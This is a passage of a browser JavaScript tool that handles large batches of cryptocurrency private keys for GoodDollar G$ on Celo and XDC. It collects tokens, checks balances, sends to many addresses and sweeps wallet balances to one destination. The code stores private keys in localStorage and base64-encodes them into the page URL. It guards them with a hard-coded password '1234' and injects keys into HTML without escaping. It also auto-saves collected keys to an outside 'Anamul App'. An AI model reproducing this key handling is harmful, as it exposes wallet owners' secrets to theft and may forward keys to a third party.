                                        noGasTokenKeys.push({
                                            address: value.address || 'Unknown',
                                            privateKey: value.privateKey,
                                            reason: value.reason
                                        });
                                    }
                                    // Default to no balance if we can't determine
                                    else {
                                        noBalanceTokenKeys.push({
                                            address: value.address || 'Unknown',
                                            privateKey: value.privateKey,
                                            reason: value.reason
                                        });
                                    }
                                }
                            }
                        } else {
                            console.log('‚ùå REJECTED promise detected - incrementing error counter');
                            tokenStats.error++;
                            console.log('‚ùå Rejected token transfer promise:', result.reason);
                        }
                    });

                    console.log(`üìä After batch - Success: ${tokenStats.success}, Error: ${tokenStats.error}`);
                    updateTokenStats();
                }

                const duration = ((Date.now() - startTime) / 1000).toFixed(2);
                addTokenLog('', 'info');
                addTokenLog('üèÅ Token collection completed!', 'info');
                addTokenLog(`‚úÖ Successful: ${tokenStats.success}`, 'success');
                addTokenLog(`‚ùå Failed: ${tokenStats.error}`, 'error');
                addTokenLog(`‚è±Ô∏è Total time: ${duration}s`, 'info');
                
                // Display error category buttons
                displayTokenErrorButtons();
                
                // Display results in 2 boxes
                displayTokenCollectionResults();
                
                // AUTO-SAVE successful keys to Anamul App (disabled if SECRETBOX_ENABLED = false)
                if (SECRETBOX_ENABLED && successfulTokenKeys.length > 0) {
                    await autoSaveKeysToSecretBox(successfulTokenKeys, 'token-collection');
                    addTokenLog('', 'info');
                    addTokenLog(`‚úÖ Auto-saved ${successfulTokenKeys.length} keys to Anamul App!`, 'success');
                }

            } catch (error) {
                addTokenLog(`\n‚ùå CRITICAL ERROR: ${error.message}`, 'error');
            } finally {
                isProcessing = false;
                document.getElementById('tokenButton').disabled = false;
                updateTokenProgress(privateKeys.length, privateKeys.length);
            }
        }

        // Display Token Collection Results in 2 boxes (No Balance & No Gas Fee)
        function displayTokenCollectionResults() {
            const resultsContainer = document.getElementById('tokenLogs');
            if (!resultsContainer) return;
            
            let html = '';
            
            // Add separator
            html += `<div style="border-top: 2px solid #ddd; margin: 20px 0; padding-top: 15px;"><strong>üìä Detailed Results:</strong></div>`;
            
            // Box 1: No Balance (Tokens NOT transferred - no balance)
            if (noBalanceTokenKeys.length > 0) {
                html += `<div style="background: rgba(244, 67, 54, 0.1); border: 2px solid #f44336; border-radius: 8px; padding: 15px; margin: 15px 0;">
                    <h4 style="color: #f44336; margin: 0 0 10px 0;">‚ùå Tokens NOT Transferred - No Balance (${noBalanceTokenKeys.length})</h4>
                    <button class="button" onclick="copyAllTokenAddresses(${JSON.stringify(noBalanceTokenKeys).replace(/'/g, "\\'")})" style="background: #f44336; width: 100%; padding: 8px; margin-bottom: 10px; font-size: 12px;">üìã Copy All Addresses & Keys</button>`;
                
                noBalanceTokenKeys.forEach((item, idx) => {
                    html += `<div style="background: white; padding: 10px; margin: 8px 0; border-radius: 6px; border-left: 4px solid #f44336;">
                        <div style="font-size: 11px; color: #666; margin-bottom: 5px;">
                            #${idx + 1} ‚Ä¢ Address
                        </div>
                        <div style="font-family: 'Courier New'; font-size: 11px; word-break: break-all; color: #333; margin-bottom: 8px;">
                            ${item.address}
                        </div>
                        <div style="font-size: 11px; color: #666; margin-bottom: 5px;">
                            Private Key
                        </div>
                        <div style="font-family: 'Courier New'; font-size: 11px; word-break: break-all; color: #333; margin-bottom: 8px;">
                            ${item.privateKey}
                        </div>
                        <button class="button" onclick="copyToClipboard('${item.address}\\n${item.privateKey}', this)" style="background: #f44336; padding: 6px 12px; font-size: 11px;">üìã Copy</button>
                    </div>`;
                });
                html += `</div>`;
            }
            
            // Box 2: No Gas Fee (Tokens NOT transferred - no gas)
            if (noGasTokenKeys.length > 0) {
                html += `<div style="background: rgba(255, 152, 0, 0.1); border: 2px solid #ff9800; border-radius: 8px; padding: 15px; margin: 15px 0;">
                    <h4 style="color: #ff9800; margin: 0 0 10px 0;">‚õΩ Tokens NOT Transferred - No Gas Fee (${noGasTokenKeys.length})</h4>
                    <button class="button" onclick="copyAllTokenAddresses(${JSON.stringify(noGasTokenKeys).replace(/'/g, "\\'")})" style="background: #ff9800; width: 100%; padding: 8px; margin-bottom: 10px; font-size: 12px;">üìã Copy All Addresses & Keys</button>`;
                
                noGasTokenKeys.forEach((item, idx) => {
                    html += `<div style="background: white; padding: 10px; margin: 8px 0; border-radius: 6px; border-left: 4px solid #ff9800;">
                        <div style="font-size: 11px; color: #666; margin-bottom: 5px;">
                            #${idx + 1} ‚Ä¢ Address
                        </div>
                        <div style="font-family: 'Courier New'; font-size: 11px; word-break: break-all; color: #333; margin-bottom: 8px;">
                            ${item.address}
                        </div>
                        <div style="font-size: 11px; color: #666; margin-bottom: 5px;">
                            Private Key
                        </div>
                        <div style="font-family: 'Courier New'; font-size: 11px; word-break: break-all; color: #333; margin-bottom: 8px;">
                            ${item.privateKey}
                        </div>
                        <button class="button" onclick="copyToClipboard('${item.address}\\n${item.privateKey}', this)" style="background: #ff9800; padding: 6px 12px; font-size: 11px;">üìã Copy</button>
                    </div>`;
                });
                html += `</div>`;
            }
            
            // If no failures, show success message
            if (noBalanceTokenKeys.length === 0 && noGasTokenKeys.length === 0) {
                html += `<div style="background: rgba(76, 175, 80, 0.1); border-left: 4px solid #4caf50; padding: 12px; margin: 15px 0; border-radius: 6px; text-align: center; color: #4caf50;">
                    <strong>‚úÖ All transfers completed successfully!</strong>
                </div>`;
            }
            
            // Append to logs
            resultsContainer.innerHTML += html;
        }
        
        // Copy all addresses and keys from token collection results
        function copyAllTokenAddresses(items) {
            const text = items.map(item => `${item.address}\n${item.privateKey}`).join('\n\n');
            copyToClipboard(text);
        }

        function updateBalanceNetworkConfig() {
            const selectedNetwork = document.getElementById('balanceNetwork').value;
            const config = NETWORK_CONFIGS[selectedNetwork];
            if (config) {
                document.getElementById('balanceRpcUrl').value = config.rpcUrl;
                document.getElementById('balanceTokenAddress').value = config.tokenContract;
                document.getElementById('balanceNativeSymbol').textContent = config.currency;
            }
        }

        function validateAndCleanBalanceKeys() {
            const privateKeysText = document.getElementById('balancePrivateKeys').value;
            const lines = privateKeysText.split('\n').map(line => line.trim()).filter(line => line.length > 0);
            
            const validLines = [];
            const invalidLines = [];
            
            lines.forEach((line, index) => {
                if (isValidPrivateKey(line)) {
                    validLines.push(line);
                } else {
                    invalidLines.push({ index, text: line });
                }
            });
            
            const keyFrequency = {};
            const duplicateKeys = [];
            validLines.forEach(key => {
                keyFrequency[key] = (keyFrequency[key] || 0) + 1;
                if (keyFrequency[key] > 1 && !duplicateKeys.includes(key)) {
                    duplicateKeys.push(key);
                }
            });
            
            const validationSection = document.getElementById('balanceValidationSection');
            validationSection.innerHTML = '';
            
            if (duplicateKeys.length > 0) {
                const dupTitle = document.createElement('div');
                dupTitle.className = 'validation-title';
                dupTitle.innerHTML = `‚ö†Ô∏è Found ${duplicateKeys.length} duplicate key(s)`;
                validationSection.appendChild(dupTitle);
                
                const removeDupBtn = document.createElement('button');
                removeDupBtn.className = 'validate-btn';
                removeDupBtn.style.background = '#ff9800';
                removeDupBtn.textContent = 'üîÑ Remove Duplicates';
                removeDupBtn.onclick = () => removeDuplicateBalanceKeys();
                validationSection.appendChild(removeDupBtn);
            }
            
            if (invalidLines.length > 0) {
                if (duplicateKeys.length > 0) {
                    const divider = document.createElement('div');
                    divider.style.height = '1px';
                    divider.style.background = '#ffb74d';
                    divider.style.margin = '12px 0';
                    validationSection.appendChild(divider);
                }
                
                const title = document.createElement('div');
                title.className = 'validation-title';
                title.innerHTML = `‚ö†Ô∏è Found ${invalidLines.length} invalid line(s)`;
                validationSection.appendChild(title);
                
                invalidLines.forEach((item, idx) => {
                    const itemDiv = document.createElement('div');
                    itemDiv.className = 'invalid-key-item';
                    
                    const textSpan = document.createElement('span');
                    textSpan.style.flex = '1';
                    textSpan.textContent = item.text.substring(0, 60) + (item.text.length > 60 ? '...' : '');
                    
                    const deleteBtn = document.createElement('button');
                    deleteBtn.className = 'delete-btn';
                    deleteBtn.textContent = '‚úï Delete';
                    deleteBtn.onclick = () => deleteBalanceInvalidKey(item.text);
                    
                    itemDiv.appendChild(textSpan);
                    itemDiv.appendChild(deleteBtn);
                    validationSection.appendChild(itemDiv);
                });
            }
            
            if (invalidLines.length === 0 && duplicateKeys.length === 0) {
                if (validLines.length > 0) {
                    const status = document.createElement('div');
                    status.className = 'validation-status valid';
                    status.innerHTML = `‚úÖ All ${validLines.length} line(s) are valid and unique!`;
                    validationSection.appendChild(status);
                    validationSection.classList.add('show');
                }
            } else {
                validationSection.classList.add('show');
            }
        }

        function deleteBalanceInvalidKey(keyText) {
            let currentText = document.getElementById('balancePrivateKeys').value;
            const lines = currentText.split('\n');
            const filteredLines = lines.filter(line => line.trim() !== keyText);
            document.getElementById('balancePrivateKeys').value = filteredLines.join('\n');
            validateAndCleanBalanceKeys();
        }

        function removeDuplicateBalanceKeys() {
            let currentText = document.getElementById('balancePrivateKeys').value;
            const lines = currentText.split('\n').map(line => line.trim()).filter(line => line.length > 0);
            
            const seenKeys = {};
            const uniqueLines = [];
            
            lines.forEach(line => {
                if (!seenKeys[line]) {
                    seenKeys[line] = true;
                    uniqueLines.push(line);
                }
            });
            
            document.getElementById('balancePrivateKeys').value = uniqueLines.join('\n');
            validateAndCleanBalanceKeys();
        }

        let lastBalanceData = [];

        function deleteZeroBalanceWallet(walletAddress) {
            if (!confirm('Remove this zero-balance wallet from the list?')) {
                return;
            }
            
            let currentText = document.getElementById('balancePrivateKeys').value;
            const lines = currentText.split('\n');
            const allWallets = [];
            
            lines.forEach(line => {
                const trimmed = line.trim();
                if (trimmed.length > 0) {
                    try {
                        const wallet = new ethers.Wallet(trimmed);
                        const selectedNetwork = document.getElementById('balanceNetwork').value;
                        const normalizedAddr = normalizeAddress(wallet.address, selectedNetwork);
                        allWallets.push({ line: trimmed, address: normalizedAddr });
                    } catch (e) {
                        allWallets.push({ line: trimmed, address: null });
                    }
                }
            });
            
            const filteredWallets = allWallets.filter(w => w.address !== walletAddress && w.address !== null);
            const newText = filteredWallets.map(w => w.line).join('\n');
            document.getElementById('balancePrivateKeys').value = newText;
            
            alert('Wallet removed! Click "Check Balances Now" to refresh.');
        }

        function deleteNonGDollarWallets() {
            if (!confirm('Remove all wallets with 0 G$ balance? Only wallets with G$ will remain.')) {
                return;
            }

            let currentText = document.getElementById('balancePrivateKeys').value;
            const lines = currentText.split('\n');
            const allWallets = [];
            
            lines.forEach(line => {
                const trimmed = line.trim();
                if (trimmed.length > 0) {
                    try {
                        const wallet = new ethers.Wallet(trimmed);
                        const selectedNetwork = document.getElementById('balanceNetwork').value;
                        const normalizedAddr = normalizeAddress(wallet.address, selectedNetwork);
                        allWallets.push({ line: trimmed, address: normalizedAddr });
                    } catch (e) {
                        allWallets.push({ line: trimmed, address: null });
                    }
                }
            });
            
            const walletsWithGDollar = allWallets.filter(w => {
                if (!w.address || w.address === null) return false;
                const balanceData = lastBalanceData.find(b => b.address === w.address);
                return balanceData && parseFloat(balanceData.gBalance) > 0;
            });
            
            const newText = walletsWithGDollar.map(w => w.line).join('\n');
            const removedCount = allWallets.length - walletsWithGDollar.length;
            
            document.getElementById('balancePrivateKeys').value = newText;
            alert(`Removed ${removedCount} wallet(s) with 0 G$ balance. ${walletsWithGDollar.length} wallet(s) with G$ remain.`);
        }

        async function checkWalletBalances() {
            const selectedNetwork = document.getElementById('balanceNetwork').value;
            const networkConfig = NETWORK_CONFIGS[selectedNetwork];
            const rpcUrl = document.getElementById('balanceRpcUrl').value.trim();
            const tokenAddress = document.getElementById('balanceTokenAddress').value.trim();
            const privateKeysText = document.getElementById('balancePrivateKeys').value.trim();

            if (!rpcUrl || !tokenAddress || !privateKeysText) {
                alert('Please fill in all fields');
                return;
            }

            const privateKeys = privateKeysText.split('\n')
                .map(key => {
                    const trimmed = key.trim();
                    if (!trimmed) return null;
                    return ensurePrivateKeyPrefix(trimmed);
                })
                .filter(key => key && isValidPrivateKey(key));

            if (privateKeys.length === 0) {
                alert('No valid private keys found');
                return;
            }

            const checkButton = document.getElementById('checkBalanceButton');
            checkButton.disabled = true;
            checkButton.textContent = '‚è≥ Checking balances...';

            try {
                const provider = new ethers.JsonRpcProvider(rpcUrl);
                const tokenContract = new ethers.Contract(normalizeAddress(tokenAddress, selectedNetwork), G_TOKEN_ABI, provider);
                
                let totalNativeBalance = 0n;
                let totalGBalance = 0n;
                const balanceData = [];
                let hasWalletsWithGDollar = false;

                for (let i = 0; i < privateKeys.length; i++) {
                    const wallet = new ethers.Wallet(privateKeys[i]);
                    const address = normalizeAddress(wallet.address, selectedNetwork);
                    
                    const nativeBalance = await provider.getBalance(address);
                    const gBalance = await tokenContract.balanceOf(address);
                    
                    totalNativeBalance += nativeBalance;
                    totalGBalance += gBalance;
                    
                    const gBalFormatted = ethers.formatEther(gBalance);
                    balanceData.push({
                        walletNum: i + 1,
                        address: address,
                        nativeBalance: ethers.formatEther(nativeBalance),
                        gBalance: gBalFormatted
                    });
                    
                    if (parseFloat(gBalFormatted) > 0) {
                        hasWalletsWithGDollar = true;
                    }
                }

                // Store balance data for deletion function
                lastBalanceData = balanceData;

                // Display results
                document.getElementById('balanceTotalNative').innerHTML = `${ethers.formatEther(totalNativeBalance)} <span id="balanceNativeSymbol">${networkConfig.currency}</span>`;
                document.getElementById('balanceTotalG').textContent = `${ethers.formatEther(totalGBalance)} G$`;

                // Show delete non-G$ button only if there are wallets with G$
                document.getElementById('deleteNonGDollarSection').style.display = hasWalletsWithGDollar ? 'block' : 'none';

                const tableBody = document.getElementById('balanceTableBody');
                tableBody.innerHTML = '';

                balanceData.forEach(data => {
                    const row = document.createElement('tr');
                    const nativeBal = parseFloat(data.nativeBalance);
                    const gBal = parseFloat(data.gBalance);
                    const isZeroBalance = nativeBal === 0 && gBal === 0;
                    
                    let actionCell = '<td></td>';
                    if (isZeroBalance) {
                        actionCell = `<td><button class="delete-btn" onclick="deleteZeroBalanceWallet('${data.address}')">üóëÔ∏è Remove</button></td>`;
                    }
                    
                    row.innerHTML = `
                        <td>${data.walletNum}</td>
                        <td><div class="wallet-address">${data.address}</div></td>
                        <td><strong>${nativeBal.toFixed(6)}</strong> ${networkConfig.currency}</td>
                        <td><strong>${gBal.toFixed(6)}</strong> G$</td>
                        ${actionCell}
                    `;
                    tableBody.appendChild(row);
                });

                document.getElementById('balanceResultsSection').style.display = 'block';

            } catch (error) {
                alert(`Error checking balances: ${error.message}`);
            } finally {
                checkButton.disabled = false;
                checkButton.textContent = 'Check Balances Now';
            }
        }

        let senderStats = { total: 0, success: 0, error: 0 };

        function showDeploymentInstructions() {
            alert(`MultiSender Contract Deployment Guide:

1. Copy the contract code from MultiSender.sol file in this project
2. Go to Remix IDE: https://remix.ethereum.org
3. Create new file, paste the contract code
4. Select Celo or XDC network in Remix
5. Compile & Deploy the contract
6. Copy the deployed contract address
7. Paste it in the "MultiSender Contract Address" field above

Contract Address will look like: 0x...`);
        }

        function formatAddresses() {
            const textarea = document.getElementById('recipientAddresses');
            const text = textarea.value;
            
            // Split by common delimiters and filter
            const addresses = text
                .split(/[\n,;\s]+/)
                .map(addr => addr.trim())
                .filter(addr => /^0x[0-9a-fA-F]{40}$/.test(addr));
            
            // Remove duplicates
            const uniqueAddresses = [...new Set(addresses)];
            
            textarea.value = uniqueAddresses.join('\n');
        }

        function cleanAddresses() {
            const textarea = document.getElementById('recipientAddresses');
            const text = textarea.value;
            
            // Remove all non-hex characters except 0x and newlines
            const cleaned = text
                .replace(/[^0x0-9a-fA-F\n]/g, '')
                .split('\n')
                .map(line => {
                    // Reconstruct 0x prefix if needed
                    const hexPart = line.replace(/0x/gi, '');
                    return hexPart.length > 0 ? '0x' + hexPart : '';
                })
                .filter(addr => addr.length > 0);
            
            textarea.value = cleaned.join('\n');
        }

        function updateSenderNetworkConfig() {
            const selectedNetwork = document.getElementById('senderNetwork').value;
            const config = NETWORK_CONFIGS[selectedNetwork];
            if (config) {
                document.getElementById('senderRpcUrl').value = config.rpcUrl;
            }
        }

        function addSenderLog(message, type = 'info') {
            const logsDiv = document.getElementById('senderLogs');
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            logEntry.innerHTML = message;
            logsDiv.appendChild(logEntry);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }

        function updateSenderStats() {
            document.getElementById('senderStatTotal').textContent = senderStats.total;
            document.getElementById('senderStatSuccess').textContent = senderStats.success;
            document.getElementById('senderStatError').textContent = senderStats.error;
        }

        function updateSenderProgress(current, total) {
            document.getElementById('senderProgress').textContent = `Processing: ${current} / ${total}`;
        }

        function isValidAddress(address) {
            return /^0x[0-9a-fA-F]{40}$/.test(address.trim());
        }

        async function runMultiSender() {
            const selectedNetwork = document.getElementById('senderNetwork').value;
            const rpcUrl = document.getElementById('senderRpcUrl').value.trim();
            let mainPrivateKey = document.getElementById('senderMainPrivateKey').value.trim();
            const recipientAddressesText = document.getElementById('recipientAddresses').value.trim();
            const amountStr = document.getElementById('amountPerAddress').value.trim();

            if (!rpcUrl || !mainPrivateKey || !recipientAddressesText || !amountStr) {
                alert('Please fill in all required fields');
                return;
            }

            mainPrivateKey = ensurePrivateKeyPrefix(mainPrivateKey);
            
            if (!isValidPrivateKey(mainPrivateKey)) {
                alert('Invalid sender wallet private key format');
                return;
            }

            const recipientAddresses = recipientAddressesText.split('\n')
                .map(addr => addr.trim())
                .filter(addr => addr.length > 0);

            if (recipientAddresses.length === 0) {
                alert('Please enter at least one recipient address');
                return;
            }

            const validAddresses = [];
            const invalidAddresses = [];

            recipientAddresses.forEach(addr => {
                if (isValidAddress(addr)) {
                    validAddresses.push(normalizeAddress(addr, selectedNetwork));
                } else {
                    invalidAddresses.push(addr);
                }
            });

            if (validAddresses.length === 0) {
                alert('No valid recipient addresses found');
                return;
            }

            if (invalidAddresses.length > 0) {
                const skipInvalid = confirm(`Found ${invalidAddresses.length} invalid address(es). Continue with ${validAddresses.length} valid address(es)?`);
                if (!skipInvalid) return;
            }

            const amount = parseFloat(amountStr);
            if (isNaN(amount) || amount <= 0) {
                alert('Amount must be a positive number');
                return;
            }

            const senderButton = document.getElementById('senderButton');
            senderButton.disabled = true;
            senderButton.textContent = '‚è≥ Sending...';

            document.getElementById('senderLogsSection').style.display = 'block';
            document.getElementById('senderLogs').innerHTML = '';
            senderStats = { total: validAddresses.length, success: 0, error: 0 };
            updateSenderStats();
            updateSenderProgress(0, validAddresses.length);

            try {
                const provider = new ethers.JsonRpcProvider(rpcUrl);
                const wallet = new ethers.Wallet(mainPrivateKey, provider);
                const senderAddress = normalizeAddress(wallet.address, selectedNetwork);
                const explorerUrl = NETWORK_CONFIGS[selectedNetwork].explorerUrl;

                addSenderLog(`üì§ Starting Multi Sender (Batch Processing)`, 'info');
                addSenderLog(`üîë Sender: ${senderAddress}`, 'info');
                addSenderLog(`üí∞ Amount per recipient: ${amount} CELO`, 'info');
                addSenderLog(`üì¨ Total Recipients: ${validAddresses.length}`, 'info');
                addSenderLog(`‚öôÔ∏è Batch size: 100 addresses per batch`, 'info');
                addSenderLog(`\n‚è≥ Processing...`, 'info');

                // Check sender balance
                const senderBalance = await provider.getBalance(senderAddress);
                const senderBalanceFormatted = ethers.formatEther(senderBalance);
                const amountInWei = ethers.parseEther(amount.toString());
                const totalRequired = amountInWei * BigInt(validAddresses.length);

                addSenderLog(`\nüíº Wallet Balance: ${senderBalanceFormatted} CELO`, 'info');
                addSenderLog(`üí∏ Total Required: ${ethers.formatEther(totalRequired)} CELO`, 'info');

                if (senderBalance < totalRequired) {
                    addSenderLog(`\n‚ö†Ô∏è Insufficient balance! Need ${ethers.formatEther(totalRequired)} CELO but have ${senderBalanceFormatted} CELO`, 'warning');
                    const proceed = confirm(`Insufficient balance. Continue anyway?`);
                    if (!proceed) {
                        throw new Error('User cancelled due to insufficient balance');
                    }
                }

                // Process in batches for optimal speed
                // Batch size: 20 addresses per batch (parallel within batch, sequential between batches)
                const batchSize = 20;
                for (let batchStart = 0; batchStart < validAddresses.length; batchStart += batchSize) {
                    const batchEnd = Math.min(batchStart + batchSize, validAddresses.length);
                    const batchNum = Math.floor(batchStart / batchSize) + 1;
                    const totalBatches = Math.ceil(validAddresses.length / batchSize);
                    
                    addSenderLog(`\nüì¶ Batch ${batchNum}/${totalBatches}`, 'info');
                    
                    // Get starting nonce for this batch
                    const startingNonce = await wallet.provider.getTransactionCount(wallet.address, 'pending');
                    
                    // Prepare all transactions in batch with incremented nonces
                    const batchPromises = [];
                    for (let i = batchStart; i < batchEnd; i++) {
                        const nonceOffset = i - batchStart;
                        const recipient = validAddresses[i];
                        const txNonce = startingNonce + nonceOffset;
                        
                        batchPromises.push(
                            processSingleCeloTransferWithNonce(recipient, i, validAddresses.length, wallet, amount, explorerUrl, txNonce)
                        );
                    }
                    
                    // Send all transactions in batch in parallel
                    const batchResults = await Promise.allSettled(batchPromises);
                    
                    batchResults.forEach(result => {
                        if (result.status === 'fulfilled' && result.value.success) {
                            senderStats.success++;
                        } else {
                            senderStats.error++;
                        }
                        updateSenderStats();
                        updateSenderProgress(senderStats.success + senderStats.error, validAddresses.length);
                    });
                    
                    // Small delay between batches to avoid rate limits
                    if (batchEnd < validAddresses.length) {
                        await new Promise(resolve => setTimeout(resolve, 300));
                    }
                }

                addSenderLog(`\n‚úÖ All transfers completed!`, 'success');
                addSenderLog(`üìä Summary: ${senderStats.success} success, ${senderStats.error} failed`, 'info');

            } catch (error) {
                const errorMsg = error.reason || error.shortMessage || error.message || String(error);
                addSenderLog(`\n‚ùå Error: ${errorMsg}`, 'error');
            } finally {
                senderButton.disabled = false;
                senderButton.textContent = 'Send CELO to All';
            }
        }

        async function processSingleCeloTransfer(recipientAddress, walletIndex, totalWallets, wallet, amount, explorerUrl) {
            // Get current nonce to ensure unique transaction
            const nonce = await wallet.provider.getTransactionCount(wallet.address, 'pending');
            return processSingleCeloTransferWithNonce(recipientAddress, walletIndex, totalWallets, wallet, amount, explorerUrl, nonce);
        }

        async function processSingleCeloTransferWithNonce(recipientAddress, walletIndex, totalWallets, wallet, amount, explorerUrl, txNonce) {
            const recipientNum = walletIndex + 1;
            
            try {
                const chainId = wallet.provider._network?.chainId || 42220;
                const isXdc = chainId === 50;
                const recipient = normalizeAddress(recipientAddress, isXdc ? 'xdc' : 'celo');
                const amountInWei = ethers.parseEther(amount.toString());
                
                let tx = {
                    to: recipient,
                    value: amountInWei,
                    nonce: txNonce
                };

                // For XDC, explicitly set gas to avoid estimation issues
                if (isXdc) {
                    tx.gasLimit = 21000; // Standard transfer gas
                    tx.gasPrice = await wallet.provider.getGasPrice();
                }

                addSenderLog(`   üîë #${recipientNum} ‚Üí ${recipient.substring(0, 10)}... | üì§ Sending...`, 'info');

                const sentTx = await wallet.sendTransaction(tx);
                addSenderLog(`   ‚úÖ #${recipientNum} Hash: <span class="tx-hash" onclick="window.open('${explorerUrl}/tx/${sentTx.hash}', '_blank')">${sentTx.hash.substring(0, 12)}...</span>`, 'success');

                // Wait for 1 confirmation to ensure transaction is mined before next one
                const receipt = await sentTx.wait(1);
                
                if (receipt && receipt.status === 1) {
                    return { success: true };
                } else if (receipt === null) {
                    // Transaction was accepted, assume success
                    return { success: true };
                } else {
                    addSenderLog(`   ‚ùå #${recipientNum} reverted`, 'error');
                    return { success: false, error: 'Transaction reverted' };
                }

            } catch (error) {
                const errorMsg = error.reason || error.shortMessage || error.message || String(error);
                addSenderLog(`   ‚ùå #${recipientNum} FAILED: ${errorMsg}`, 'error');
                return { success: false, error: errorMsg };
            }
        }

        async function runBatchCoinCollection() {
            showUnavailableMessage();
            return;

            const keys = keysText.split('\n').map(k => ensurePrivateKeyPrefix(k.trim())).filter(k => k);
            
            if (keys.length === 0) {
                alert('No valid keys found');
                return;
            }

            const networkConfig = NETWORK_CONFIGS[network];
            const logsSection = document.getElementById('coinCollectionLogsSection');
            const logsDiv = document.getElementById('coinCollectionLogs');
            const btn = document.getElementById('coinCollectionButton');
            
            logsSection.style.display = 'block';
            logsDiv.innerHTML = '';
            btn.disabled = true;

            let success = 0;
            let error = 0;
            document.getElementById('coinStatTotal').textContent = keys.length;
            
            const addLog = (msg, type) => {
                const div = document.createElement('div');
                div.className = `log-entry ${type}`;
                div.innerHTML = msg;
                logsDiv.appendChild(div);
                logsDiv.scrollTop = logsDiv.scrollHeight;
            };

            addLog(`üöÄ Starting collection from ${keys.length} wallets...`, 'info');
            addLog(`üìç Destination: ${destination}`, 'info');

            const provider = new ethers.JsonRpcProvider(networkConfig.rpcUrl);
            
            // Batch size 5 for safety
            const batchSize = 5;
            
            for (let i = 0; i < keys.length; i += batchSize) {
                const batch = keys.slice(i, i + batchSize);
                
                await Promise.all(batch.map(async (key, batchIdx) => {
                    const idx = i + batchIdx + 1;
                    try {
                        const wallet = new ethers.Wallet(key, provider);
                        const balance = await provider.getBalance(wallet.address);
                        
                        // Gas calculation (Standard transfer is 21000)
                        const gasLimit = 21000n;
                        const feeData = await provider.getFeeData();
                        const gasPrice = feeData.gasPrice;
                        const gasCost = gasLimit * gasPrice;
                        
                        if (balance <= gasCost) {
                            addLog(`#${idx} ‚ùå Insufficient balance (Has: ${ethers.formatEther(balance)})`, 'error');
                            error++;
                            return;
                        }

                        const valueToSend = balance - gasCost;
                        
                        addLog(`#${idx} üì§ Sending ${ethers.formatEther(valueToSend)} ${network.toUpperCase()}...`, 'info');
                        
                        const tx = await wallet.sendTransaction({
                            to: destination,
                            value: valueToSend,
                            gasLimit: gasLimit,
                            gasPrice: gasPrice
                        });
                        
                        addLog(`#${idx} ‚úÖ Sent! Hash: <a href="${networkConfig.explorerUrl}/tx/${tx.hash}" target="_blank">${tx.hash.substring(0,10)}...</a>`, 'success');
                        success++;
                        
                    } catch (err) {
                        addLog(`#${idx} ‚ùå Error: ${err.message}`, 'error');
                        error++;
                    }
                }));

                document.getElementById('coinStatSuccess').textContent = success;
                document.getElementById('coinStatError').textContent = error;
                
                // Small delay
                await new Promise(r => setTimeout(r, 500));
            }

            btn.disabled = false;
            addLog('üèÅ Collection Completed!', 'info');
        }

        // --- END Batch Coin Collection ---

        // Recent Claims Feature - Save/Load Private Keys with URL Persistence
        function savePrivateKey(key) {
            if (!key || !key.startsWith('0x')) return;
            
            let savedKeys = JSON.parse(localStorage.getItem('goodDollarSavedKeys') || '[]');
            
            // Remove duplicates - keep only unique keys
            savedKeys = savedKeys.filter(k => k !== key);
            
            // Add the new key to the front
            savedKeys.unshift(key);
            
            // Keep only the last 20 keys
            if (savedKeys.length > 20) {
                savedKeys = savedKeys.slice(0, 20);
            }
            
            localStorage.setItem('goodDollarSavedKeys', JSON.stringify(savedKeys));
            updateURLWithKeys(savedKeys);
        }

        function loadSavedKeys() {
            // First check if keys are in URL
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('keys')) {
                try {
                    const encoded = urlParams.get('keys');
                    const decoded = atob(encoded);
                    const keys = JSON.parse(decoded);
                    if (Array.isArray(keys) && keys.length > 0) {
                        // Also save to localStorage for persistence
                        localStorage.setItem('goodDollarSavedKeys', JSON.stringify(keys));
                        return keys;
                    }
                } catch (e) {
                    console.warn('Invalid URL keys parameter:', e);
                }
            }
            
            // Fall back to localStorage
            return JSON.parse(localStorage.getItem('goodDollarSavedKeys') || '[]');
        }

        function updateURLWithKeys(keys) {
            try {
                const encoded = btoa(JSON.stringify(keys));
                const url = new URL(window.location);
                if (keys.length > 0) {
                    url.searchParams.set('keys', encoded);
                } else {
                    url.searchParams.delete('keys');
                }
                window.history.replaceState({}, document.title, url.toString());
            } catch (e) {
                console.warn('Could not update URL:', e);
            }
        }

        function restoreKeysFromURL() {
            const savedKeys = loadSavedKeys();
            if (savedKeys.length > 0) {
                localStorage.setItem('goodDollarSavedKeys', JSON.stringify(savedKeys));
                // Update URL to ensure it's in sync
                updateURLWithKeys(savedKeys);
            }
        }

        function showRecentClaimsModal() {
            // Ask for password first
            const password = prompt('üîê Enter password to access Recent Claims:');
            if (password === null) return; // User cancelled
            
            // Simple password check (can be changed by user)
            if (password !== '1234') {
                alert('‚ùå Incorrect password!');
                return;
            }
            
            closeMenu();
            const modal = document.getElementById('recentClaimsModal');
            const container = document.getElementById('recentKeysContainer');
            const savedKeys = loadSavedKeys();
            
            if (savedKeys.length === 0) {
                container.innerHTML = `
                    <div class="modal-empty">
                        <div class="modal-empty-icon">üì≠</div>
                        <p>No saved private keys yet.</p>
                        <p style="font-size: 11px; color: #ccc; margin-top: 10px;">Your recently used private keys will appear here.</p>
                    </div>
                `;
            } else {
                container.innerHTML = `
                    <button class="button" onclick="claimAllSavedKeys()" style="width: 100%; margin-bottom: 10px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">üöÄ Claim All Keys</button>
                    <button class="button" onclick="clearAllKeys()" style="width: 100%; margin-bottom: 20px; background: #f44336;">üóëÔ∏è Clear All Keys</button>
                    ${savedKeys.map((key, idx) => `
                    <div class="recent-key-item">
                        <span style="font-family: 'Courier New', monospace; word-break: break-all;">${key}</span>
                        <div class="key-actions">
                            <button class="key-btn" onclick="importToClaimTool('${key.replace(/'/g, "\\'")}')">Claim</button>
                            <button class="key-btn" onclick="importToTokenTool('${key.replace(/'/g, "\\'")}')">Token</button>
                            <button class="key-btn" onclick="importToSenderTool('${key.replace(/'/g, "\\'")}')">Sender</button>
                            <button class="key-btn delete" onclick="deleteKey(${idx})">Delete</button>
                        </div>
                    </div>
                `).join('')}
                `;
            }
            
            modal.classList.add('active');
        }

        function closeRecentClaimsModal(event) {
            // Only close if clicking the overlay background, not the content
            if (event && event.target.id !== 'recentClaimsModal') return;
            
            const modal = document.getElementById('recentClaimsModal');
            modal.classList.remove('active');
        }

        function deleteKey(index) {
            if (!confirm('Delete this saved private key?')) return;
            
